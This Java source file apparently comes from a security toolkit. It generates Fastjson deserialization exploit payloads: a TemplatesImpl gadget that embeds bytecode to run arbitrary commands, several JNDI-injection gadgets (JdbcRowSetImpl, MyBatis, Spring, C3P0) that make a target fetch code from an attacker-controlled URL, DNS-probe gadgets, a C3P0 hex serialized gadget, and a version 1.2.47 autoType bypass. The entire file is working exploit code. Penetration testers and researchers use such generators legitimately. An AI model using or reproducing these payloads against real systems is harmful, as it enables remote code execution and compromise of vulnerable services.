package com.xyuxu.javasec.core.generator;

import java.util.Base64;

public class FastjsonPaylodGenerator {

    // ==========================================
    // 1. TemplatesImpl
    // ==========================================
    public static String generateTemplatesImpl(String command, String echoType) throws Exception {
        byte[] code;
        if (echoType != null && !echoType.isEmpty() && !echoType.equals("None")) {
            // 【回显模式】：调用你的 Echo 生成器，这里 bypassJDK17 先默认传 false，或者以后你再加个开关
            code = EchoByteCodeGenerator.getBytecode(echoType, false);
        } else {
            // 【普通模式】：硬编码命令执行
            code = TemplatesBytecodeGenerator.createTemplatesImplExecBytes(command);
        }
        String base64Code = Base64.getEncoder().encodeToString(code);
        return "{\n" +
                "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "    \"_bytecodes\": [\"" + base64Code + "\"],\n" +
                "    \"_name\": \"foo\",\n" +
                "    \"_tfactory\": {},\n" +
                "    \"_outputProperties\": {}\n" +
                "}";
    }
    // ==========================================
    // 2. JNDI 注入类
    // ==========================================

    // JdbcRowSetImpl
    public static String generateJdbcRowSetImpl(String jndiUrl) {
        return "{\n" +
                "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "    \"dataSourceName\": \"" +jndiUrl + "\",\n" +
                "    \"autoCommit\": true\n" +
                "}";
    }
    // MyBatis
    public static String generateJndiDataSourceFactory(String jndiUrl) {
        return "{\n" +
                "    \"@type\": \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
                "    \"properties\": {\n" +
                "        \"data_source\": \"" +jndiUrl + "\"\n" +
                "    }\n" +
                "}";
    }
    // Spring PropertyPathFactoryBean
    public static String generateSpringPropertyPath(String jndiUrl) {
        return "{\n" +
                "    \"@type\": \"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\n" +
                "    \"targetBeanName\": \"" +jndiUrl + "\",\n" +
                "    \"propertyPath\": \"foo\",\n" +
                "    \"beanFactory\": {\n" +
                "      \"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\n" +
                "      \"shareableResources\": [\n" +
                "        \"" + jndiUrl + "\"\n" +
                "      ]\n" +
                "    }\n" +
                "}";
    }
    // Spring DefaultBeanFactoryPointcutAdvisor
    public static String generateSpringAdvisor(String jndiUrl) {
        return "{\n" +
                "  \"@type\": \"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\n" +
                "   \"beanFactory\": {\n" +
                "     \"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\n" +
                "     \"shareableResources\": [\n" +
                "       \"" +jndiUrl + "\"\n" +
                "     ]\n" +
                "   },\n" +
                "   \"adviceBeanName\": \"" +jndiUrl + "\"\n" +
                "}";
    }
    // C3P0 JndiRefForwardingDataSource
    public static String generateC3P0Jndi(String jndiUrl) {
        return "{\n" +
                "    \"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n" +
                "    \"jndiName\": \"" +jndiUrl + "\",\n" +
                "    \"loginTimeout\": 0\n" +
                "}";
    }

    // ==========================================
    // 4. DNS 探测类
    // ==========================================
    public static String generateDnsInetAddress(String dnsLog) {
        return "{\n" +
                "    \"@type\": \"java.net.InetAddress\",\n" +
                "    \"val\": \"" + dnsLog + "\"\n" +
                "}";
    }
    public static String generateDnsInet6Address(String dnsLog) {
        return "{\n" +
                "    \"@type\": \"java.net.Inet6Address\",\n" +
                "    \"val\": \"" + dnsLog + "\"\n" +
                "}";
    }
    public static String generateDnsURL(String dnsLog) {
        return "{\n" +
                "    \"@type\": \"java.net.URL\",\n" +
                "    \"val\": \"" + dnsLog + "\"\n" +
                "}";
    }
    // ==========================================
    // 5. C3P0 Hex 序列化
    // ==========================================
    public static String generateC3P0Hex(String hexString) {
        return "{\n" +
                "    \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                "    \"userOverridesAsString\": \"HexAsciiSerializedMap:" + hexString + ";\"\n" +
                "}";
    }
    // ==========================================
    // 6. Bypass 1.2.47
    // ==========================================
    public static String generateJdbcRowSetImplBypass47(String jndiUrl) {
        return "{\n" +
                "    \"a\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\": \"" +jndiUrl + "\",\n" +
                "        \"autoCommit\": true\n" +
                "    }\n" +
                "}";
    }
}